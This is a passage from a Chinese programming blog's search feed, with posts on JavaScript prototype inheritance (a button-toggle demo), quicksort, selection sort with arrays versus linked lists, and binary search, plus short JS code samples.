class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span></span><br><span class="line">      body &#123;</span><br><span class="line">        margin: 0;</span><br><span class="line">        padding: 0;</span><br><span class="line">      &#125;</span><br><span class="line">      div &#123;</span><br><span class="line">        float: left;</span><br><span class="line">        margin: 5px;</span><br><span class="line">        border: 2px solid rgba(226, 121, 247);</span><br><span class="line">        height: 300px;</span><br><span class="line">        width: 500px;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      *<span class="selector-attr">[name=<span class="string">"sec"</span>]</span> &#123;</span></span><br><span class="line">        margin: 0;</span><br><span class="line">        padding: 0;</span><br><span class="line">        height: 80%;</span><br><span class="line">        font-size: 100px;</span><br><span class="line">        color: pink;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="css">      <span class="selector-tag">input</span><span class="selector-attr">[name]</span> &#123;</span></span><br><span class="line">        background-color: pink;</span><br><span class="line"><span class="css">        <span class="comment">/* border: pink; */</span></span></span><br><span class="line">        width: 100%;</span><br><span class="line">        height: 10%;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"切换"</span> <span class="attr">name</span>=<span class="string">"switch"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"隐藏"</span> <span class="attr">name</span>=<span class="string">"hide"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">name</span>=<span class="string">"sec"</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app2"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"切换"</span> <span class="attr">name</span>=<span class="string">"switch"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"隐藏"</span> <span class="attr">name</span>=<span class="string">"hide"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">section</span> <span class="attr">name</span>=<span class="string">"sec"</span>&gt;</span><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app3"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"切换"</span> <span class="attr">name</span>=<span class="string">"switch"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"隐藏"</span> <span class="attr">name</span>=<span class="string">"hide"</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">nav</span> <span class="attr">name</span>=<span class="string">"sec"</span>&gt;</span><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">Animation</span><span class="params">()</span> </span>&#123;&#125;</span></span><br><span class="line"><span class="actionscript">      Animation.prototype.hide = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.style.display = <span class="string">'none'</span>;</span></span><br><span class="line">      &#125;;</span><br><span class="line"><span class="actionscript">      Animation.prototype.show = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.style.display = <span class="string">'block'</span>;</span></span><br><span class="line">      &#125;;</span><br><span class="line"><span class="actionscript">      Animation.prototype.change = <span class="function"><span class="keyword">function</span> <span class="params">(color, value)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.style.backgroundColor = color;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.innerHTML = value;</span></span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">      <span class="comment">// * 原型继承工厂函数</span></span></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">extend</span><span class="params">(child, dad)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        child.prototype = <span class="built_in">Object</span>.create(dad.prototype);</span></span><br><span class="line">        child.prototype.constructor = child;</span><br><span class="line"><span class="javascript">        <span class="built_in">Object</span>.defineProperty(child, <span class="string">'constructor'</span>, &#123;</span></span><br><span class="line">          value: child,</span><br><span class="line"><span class="actionscript">          enumerable: <span class="literal">false</span>,</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">      <span class="function"><span class="keyword">function</span> <span class="title">App</span><span class="params">(id, data=&#123;&#125;)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.div = <span class="built_in">document</span>.querySelector(id);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.btnS = <span class="keyword">this</span>.div.querySelector(<span class="string">'[name="switch"]'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.btnH = <span class="keyword">this</span>.div.querySelector(<span class="string">'[name="hide"]'</span>);</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.sec = <span class="keyword">this</span>.div.querySelector(<span class="string">'[name="sec"]'</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.data = <span class="built_in">Object</span>.assign(&#123;</span></span><br><span class="line"><span class="actionscript">          color: [<span class="string">'#8e44ad'</span>, <span class="string">'#16a085'</span>], </span></span><br><span class="line"><span class="actionscript">          value: [<span class="string">'你好'</span>, <span class="string">'再见'</span>],</span></span><br><span class="line"><span class="actionscript">          tog: <span class="literal">true</span>, <span class="comment">//用于记录切换状态</span></span></span><br><span class="line">        &#125;,data)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      extend(App, Animation);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">      App.prototype.changeIf = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.btnH.addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (<span class="keyword">this</span>.btnH.value === <span class="string">'隐藏'</span>) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.hide.call(<span class="keyword">this</span>.sec);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.btnH.value = <span class="string">'显示'</span>;</span></span><br><span class="line"><span class="actionscript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.show.call(<span class="keyword">this</span>.sec);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.btnH.value = <span class="string">'隐藏'</span>;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">      App.prototype.toggle = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.btnS.addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">if</span> (<span class="keyword">this</span>.data.tog) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.change.call(<span class="keyword">this</span>.sec, <span class="keyword">this</span>.data.color[<span class="number">1</span>], <span class="keyword">this</span>.data.value[<span class="number">1</span>]);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.data.tog = !<span class="keyword">this</span>.data.tog;</span></span><br><span class="line"><span class="actionscript">          &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.change.call(<span class="keyword">this</span>.sec, <span class="keyword">this</span>.data.color[<span class="number">0</span>], <span class="keyword">this</span>.data.value[<span class="number">0</span>]);</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">this</span>.data.tog = !<span class="keyword">this</span>.data.tog;</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">      App.prototype.init = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.show.call(<span class="keyword">this</span>.sec)</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.change.call(<span class="keyword">this</span>.sec, <span class="keyword">this</span>.data.color[<span class="number">0</span>], <span class="keyword">this</span>.data.value[<span class="number">0</span>])</span></span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">      App.prototype.run = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.toggle();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.changeIf();</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.init()</span></span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> div1 = <span class="keyword">new</span> App(<span class="string">'#app1'</span>, &#123;</span></span><br><span class="line"><span class="actionscript">       color: [<span class="string">'#27ae60'</span>, <span class="string">'#2980b9'</span>],</span></span><br><span class="line"><span class="actionscript">       value: [<span class="string">'hello'</span>, <span class="string">'bye'</span>] </span></span><br><span class="line">      &#125;);</span><br><span class="line">      div1.run();</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> div2 = <span class="keyword">new</span> App(<span class="string">'#app2'</span>);</span></span><br><span class="line">      div2.run();</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> div3 = <span class="keyword">new</span> App(<span class="string">'#app3'</span>, &#123;</span></span><br><span class="line"><span class="actionscript">        color: [<span class="string">'#d35400'</span>, <span class="string">'#f39c12'</span>]</span></span><br><span class="line">      &#125;)</span><br><span class="line">      div3.run()</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>思维导图总结</p><p><img src= "/img/loading.gif" data-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210529101210203.png" alt="image-20210529101210203"></p><p>这便是对以上全部知识点综合练习的案例了，不足之处还望批评指出，<strong>请多多指教</strong></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ES6 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速排序</title>
      <link href="/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"/>
      <url>/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="D-amp-C（分而治之）"><a href="#D-amp-C（分而治之）" class="headerlink" title="D&amp;C（分而治之）"></a>D&amp;C（分而治之）</h2><p>工作原理：</p><ol><li>找出简单的基线条件；</li><li>确定如何缩小问题的规模，使其符合基线条件</li></ol><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>对一块400m * 640m的土地进行划分</p><img src= "/img/loading.gif" data-src="/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/image-20210829165345879.png" alt="image-20210829165345879" style="zoom:50%;"><p>对于640 m × 400 m的土地，可从中划出的最 大方块为400 m × 400 m。 这将余下一块更小的土地，其尺寸为400 m × 240 m</p><p><img src= "/img/loading.gif" data-src="/2021/08/20/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/image-20210829165421947.png" alt="image-20210829165421947"></p><blockquote><p>重点：适用于这小块地的最大方块（正方形），也是适用于整块地的最大方块</p><p>这是关于“欧几里得算法”的知识</p></blockquote><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><blockquote><p>采用分而治之的思想进行排序，是对<a href="https://baike.baidu.com/item/冒泡排序/4602306" target="_blank" rel="noopener">冒泡排序</a>算法的一种改进</p></blockquote><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤:"></a>步骤:</h3><p>1) 选择基准值。</p><p>2) 将数组分成两个子数组：小于基准值的元素和大于基准值的元素。 </p><p>3) 对这两个子数组进行快速排序。</p><h2 id="代码实例"><a href="#代码实例" class="headerlink" title="代码实例"></a>代码实例</h2><p>使用快速排序进行排序</p><ol><li>定义左数组存储比当前值小的值，右数组存储比当前数值大的值，以及当前比较目标值</li><li>定义基线条件：当当前传参数组索引小于等于1时，停止执行下面代码并返回当前数组</li><li>定义递归条件<ol><li>截取当前数组内要进行比较的目标值，避免参与遍历导致无限循环</li><li>进行遍历：大于当前值放至右数组，小于当前值放至左数组</li></ol></li><li>返回左数组＋当前值+右数组</li></ol><p>![carbon (1)](快速排序/carbon (1).png)</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>D&amp;C将问题逐步分解。使用D&amp;C处理列表时，基线条件很可能是空数组或只包含一个元素的数组。</li><li>实现快速排序时，请随机地选择用作基准值的元素。快速排序的平均运行时间为O(n log n)。 </li><li>大O表示法中的常量有时候事关重大，这就是快速排序比合并排序快的原因所在。 </li><li>比较简单查找和二分查找时，常量几乎无关紧要，因为列表很长时，O(log n)的速度比O(n) 快得多。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>选择排序</title>
      <link href="/2021/08/12/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/"/>
      <url>/2021/08/12/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="内存工作原理"><a href="#内存工作原理" class="headerlink" title="内存工作原理"></a>内存工作原理</h2><p>这里涉及的数据类型为<a href="https://blog.csdn.net/Oralinge/article/details/103585108" target="_blank" rel="noopener">引用类型</a>，计算机就像是很多抽屉的集合体，每个抽屉都有地址，当你往里面存储数据时，计算机会将每个数据存储到各自的“抽屉”去，然后用一个内存地址指向该抽屉，方便你根据内存地址去拿取你所需的值</p><p>需要将数据存储到内存时，你请求计算机提供存储空间，计算机给你一个存储地址。需要存储多项数据时，有两种基本方式——数组和链表。</p><h2 id="数组和链表"><a href="#数组和链表" class="headerlink" title="数组和链表"></a>数组和链表</h2><p>这里只会简单阐述数组和链表的概念，更多会讲述这两种不同数据类型的区别</p><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><blockquote><p>链表是一种物理<a href="https://baike.baidu.com/item/存储单元/8727749" target="_blank" rel="noopener">存储单元</a>上非连续、非顺序的<a href="https://baike.baidu.com/item/存储结构/350782" target="_blank" rel="noopener">存储结构</a>，<a href="https://baike.baidu.com/item/数据元素/715313" target="_blank" rel="noopener">数据元素</a>的逻辑顺序是通过链表中的<a href="https://baike.baidu.com/item/指针/2878304" target="_blank" rel="noopener">指针</a>链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储<a href="https://baike.baidu.com/item/数据元素" target="_blank" rel="noopener">数据元素</a>的数据域，另一个是存储下一个结点地址的<a href="https://baike.baidu.com/item/指针/2878304" target="_blank" rel="noopener">指针</a>域。 </p></blockquote><p>简单来说，链表中的元素可存储在内存的任何地方，链表的每个元素都存储了下一个元素的地址，从而使一系列随机的内存地址串在一起。所以，<strong>链表的优势在插入元素方面</strong>。</p><p>当你要往数组插入元素时，计算机要根据数组的长度去寻找一块连续的跟该数组长度相匹配的内存去进行存储，而链表只要存储下个元素的内存地址即可，所以即使链表中的各个数据是分开的不连续的，但还是能通过上一个数据去寻找下个数据的位置。所以在插入数据方面，链表无需考虑其他，直接往内存插入新值即可</p><p>这里举个例子，你和两个朋友去看电影，一般来说，你们三个如果关系太好了，好基友那种，分不开了，你们一般会买三张连续座位的票，从而可以坐在一起看，这便是数组，而当没有三张连续的电影票时，你们只能分开看，但可以根据电影票上的座位位置去找你的小伙伴，这便是链表。这里的座位编号便是内存地址，而你们就是一个又一个的数据。</p><p>在删除方面：链表也是更好的选择，因为只需修改前一个元素指向的地址即可。而使用数组时，删除元素后，必须将后面的元素都向前移</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><blockquote><p><strong>数组</strong>（Array）是有序的元素序列。 [1] 若将有限个类型相同的变量的<a href="https://baike.baidu.com/item/集合/2908117" target="_blank" rel="noopener">集合</a>命名，那么这个名称为数组名。组成数组的各个变量称为数组的分量，也称为数组的元素，有时也称为<a href="https://baike.baidu.com/item/下标变量/12713827" target="_blank" rel="noopener">下标变量</a>。用于区分数组的各个元素的数字编号称为下标。数组是在<a href="https://baike.baidu.com/item/程序设计/223952" target="_blank" rel="noopener">程序设计</a>中，为了处理方便， 把具有相同类型的若干元素按<strong>有序</strong>的形式组织起来的一种形式。  这些有序排列的同类数据元素的集合称为数组</p></blockquote><p>数组的优势：需要随机地读取元素时，数组的效率很高，因为可迅速找到数组的任何元素。在链表中，元素并非靠在一起的，你无法迅速计算出第五个元素的内存地址，而必须先访问第一个元素以获取第二个元素的地址，再访问第二个元素以获取第三个元素 的地址，以此类推，直到访问第五个元素</p><h3 id="两者总结"><a href="#两者总结" class="headerlink" title="两者总结"></a>两者总结</h3><ul><li>链表的每个元素都存储了下一个元素的地址，从而使一系列随机的内存地址串在一起</li><li>数组的元素都在一起</li><li>数组的读取速度比链表快</li><li>链表的插入和删除速度比数组快</li><li>在同一个数组中，所有元素的类型都必须相同</li></ul><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p><a href="https://baike.baidu.com/item/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/9762418" target="_blank" rel="noopener">选择排序（Selection sort）</a>是一种简单直观的排序算法。它的工作原理是：第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法</p></blockquote><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕</p><h3 id="具体实现过程"><a href="#具体实现过程" class="headerlink" title="具体实现过程"></a>具体实现过程</h3><p>有没有思考过对一组数进行排序时的过程是怎样的</p><p>比如要对【1，3，9，5，2】数组进行排序</p><ol><li>我们首先在原数组内进行比较，找出最大值，结果是9，所以我们把他放到新建数组第一个位置【9】</li><li>接着在剩下的数组遍历找出最大的值，是5，放到新数组第二个位置【9，5】</li><li>继续对剩下的三个数字进行同样操作【1，3，2】，得出最终结果【9，5，3，2，1】</li></ol><p>这便是选择排序的过程，一共需要几步呢上面，每次都对原数组进行比较排序，需要进行5趟比较，每趟比较又是和另外几个数的比较，也是5次，所以最终的所需的步数是25，也就是n²</p><blockquote><p>随着排序的进行，每次需要检查的元素数在逐渐减少，最后一次需要检查的元素都只有一 个。既然如此，运行时间怎么还是O(n² )呢</p><p>确实，并非每次都需要检查n个元素。第一次需要检查n个元素，但随后检查的元素 数依次为n - 1, n – 2, …, 2和1。平均每次检查的元素数为1/2 × n，因此运行时间为O(n × 1/2 × n)。 但<strong>大O表示法省略诸如1/2这样的常数</strong></p></blockquote><h2 id="选择排序实例代码"><a href="#选择排序实例代码" class="headerlink" title="选择排序实例代码"></a>选择排序实例代码</h2><ol><li><p>数组内比较使用一个函数max进行最大值获取，对数组内每个值进行遍历，找出最大值的索引，具体思路如下</p><blockquote><p>使用变量存储最大值以及最大值索引，给其赋初始值，即为数组第一个数据，接着对数组内数据进行遍历，若遍历到的数据比当前数值大，即将当前变量赋值为它，不断执行该操作，直到遍历完返回该数值索引</p></blockquote></li><li><p>对数组进行排序sort的主函数，使用新数组进行存储排序后的值，接着对原数组进行遍历和最大值查找，找出一个便在原数组删除该数据，避免引起无限循环导致内存泄漏，重复执行，直到最终结果出来</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/08/12/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F.png" alt="选择排序"></p><h3 id="优化版"><a href="#优化版" class="headerlink" title="优化版"></a>优化版</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">selectSort</span>(<span class="params">arr</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">index1, index2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> temp = arr[index1];</span><br><span class="line">    arr[index1] = arr[index2];</span><br><span class="line">    arr[index2] = temp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> minIndex = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">      arr[minIndex] &gt; arr[j] &amp;&amp; (minIndex = j);</span><br><span class="line">    &#125;</span><br><span class="line">    swap(minIndex, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二分法</title>
      <link href="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
      <url>/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>二分查找也称折半查找（Binary Search），它是一种效率较高的查找方法。但是，折半查找要求线性表必须采用顺序存储结构，而且表中元素按关键字有序排列。</p></blockquote><h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功</p><h2 id="简单查找"><a href="#简单查找" class="headerlink" title="简单查找"></a>简单查找</h2><p>我们在日常生活中经常会玩一个游戏：找数字</p><p>提问者给出该数字的范围，然后回答者根据这个范围进行猜数，如果比正确答案大，提问者便会说大了，如若小了，则提问者回答小了，直至猜出正确答案</p><p>比如：提问者随便想出一个数字-57，范围是0-100，回答者开始猜，如下图</p><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829090857846.png" alt="算法图解-简单查找"></p><p>等到他猜到57，便成功猜到正确答案了，这便是简单查找，回答者一个一个说，直到正确答案出来</p><h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><p>更简单的查找方式，根据方法名即可猜到，将猜测范围一分为二，比如0-100，那么你猜50，无论是大了还是小了，你立即就可以排除掉一半的数字，接着重复一分为二的操作进行猜数，最后得出正确答案</p><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091346823.png" alt="image-20210829091346823"></p><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091357416.png" alt="image-20210829091357416"></p><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091407604.png" alt="image-20210829091407604"></p><p>梳理下这个猜数的过程，我们一共进行了几步</p><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091706567.png" alt="image-20210829091706567"></p><p>回过头去，如果你采用暴力式简单查找，那么你猜的数字便是n（答案n）步，如果目标数字小，还好，如果是99呢，你就得猜到99才能猜到</p><p>引用书籍的另一个例子——</p><blockquote><p>假设你要在字典中查找一个单词，而该字典包含240 000个单词， 你认为每种查找最多需要多少步？ 如果要查找的单词位于字典末尾，使用简单查找将需要240 000步。使用二分查找时，每次排除一半单词，直到最后只剩下一个单词。</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829092007999.png" alt="image-20210829092007999"></p><p>可见，随着要猜的范围越来越大，二分查找的优势也越加凸显，而二分查找所需的步数也符合对数的规律</p><blockquote><p>二分查找最多需要log2n步</p></blockquote><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="简单查找-1"><a href="#简单查找-1" class="headerlink" title="简单查找"></a>简单查找</h3><p>我们首先看简单查找的代码实现（这里包括后面只会给出图片格式的代码，因为更多的希望通过实操去理解每个算法的过程）</p><p>直接通过遍历，一个一个判断，最后返回结果</p><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/%E7%AE%80%E5%8D%95%E6%9F%A5%E6%89%BE.png" alt></p><h3 id="二分查找-1"><a href="#二分查找-1" class="headerlink" title="二分查找"></a>二分查找</h3><p>看看二分查找的实现代码（因为是根据自己的理解所写，所以多多少少可能会有不合理的地方，望指出）</p><ol><li>首先是写一个回答函数，相当于提问者的回答，传入参数包括回答者的数字和正确的数字</li><li>接着便是使用二分法进行猜数，每次猜中间数，对了返回，不对就根据情况进行数组裁剪，裁剪完继续重复该函数（递归思想）</li></ol><p><img src= "/img/loading.gif" data-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.png" alt="二分查找"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>O(log n)比O(n)快（也就是二分法比简单查找快），当需要搜索的元素越多时，前者比后者快得越多</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归</title>
      <link href="/2021/07/22/%E9%80%92%E5%BD%92/"/>
      <url>/2021/07/22/%E9%80%92%E5%BD%92/</url>
      
